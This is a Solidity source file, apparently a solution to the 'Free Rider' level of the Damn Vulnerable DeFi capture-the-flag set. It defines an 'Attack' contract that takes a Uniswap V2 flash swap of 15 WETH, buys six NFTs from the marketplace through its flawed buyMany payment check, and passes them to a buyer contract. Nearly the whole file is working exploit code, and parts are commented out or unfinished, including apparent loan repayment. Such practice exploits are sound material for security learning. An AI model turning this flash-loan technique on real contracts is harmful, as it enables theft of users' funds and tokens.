pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderBuyer.sol";
import "./DamnValuableNFT.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface WETH {
    function transferFrom(
        address,
        address,
        uint256
    ) external returns (bool);

    function withdraw(uint256) external;

    function balanceOf(address) external returns (uint256);
}

interface UniswapV2Pair {
    function swap(
        uint256,
        uint256,
        address,
        bytes memory
    ) external;
}

contract Attack is IERC721Receiver {
    address payable private nftMarketPlace;
    address payable private riderBuyer;
    uint256[] private tokensIds = [0, 1, 2, 3, 4, 5];
    address payable private damnValuableNFT;
    WETH private weth;
    address payable uniswapPair;
    uint256 private received;
    DamnValuableNFT public token;

    constructor(
        address _nftMarketPlace,
        address _riderBuyer,
        address _damnValuableNFT,
        address _weth,
        address _uniswapPair
    ) {
        riderBuyer = payable(_riderBuyer);
        nftMarketPlace = payable(_nftMarketPlace);
        damnValuableNFT = payable(_damnValuableNFT);
        weth = WETH(_weth);
        uniswapPair = payable(_uniswapPair);
        token = new DamnValuableNFT();
    }

    function transferToMarket() public {
        UniswapV2Pair(uniswapPair).swap(
            15 ether,
            0,
            address(this),
            abi.encode("callme()")
        );
    }

    receive() external payable {}

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external override returns (bytes4) {
        // received++;
        // if (received == 6) {
        // for (uint256 i = 0; i < tokensIds.length; i++) {
        // token.safeTransferFrom(token.ownerOf(_tokenId), msg.sender, i);
        // DamnValuableNFT(damnValuableNFT).transferFrom(
        //     address(this),
        //     riderBuyer,
        //     i
        // );
        // }

        //}
        // token.safeTransferFrom(token.ownerOf(_tokenId), msg.sender, _tokenId);
        return IERC721Receiver.onERC721Received.selector;
    }

    fallback() external payable {
        // revert("not possible");
        // console.log("received: ", WETH(weth).balanceOf(address(this)));
        console.log("balance before eth : ", tx.origin.balance);
        weth.withdraw(15 ether);
        console.log("after withdraw");
        FreeRiderNFTMarketplace(nftMarketPlace).buyMany{value: 15 ether}(
            tokensIds
        );
        for (uint256 i = 0; i < tokensIds.length; i++) {
            DamnValuableNFT(damnValuableNFT).safeTransferFrom(
                address(this),
                riderBuyer,
                i
            );
        }
        console.log("balance eth : ", tx.origin.balance);
        // weth.transferFrom(msg.sender, nftMarketPlace, 15 ether);
    }
}
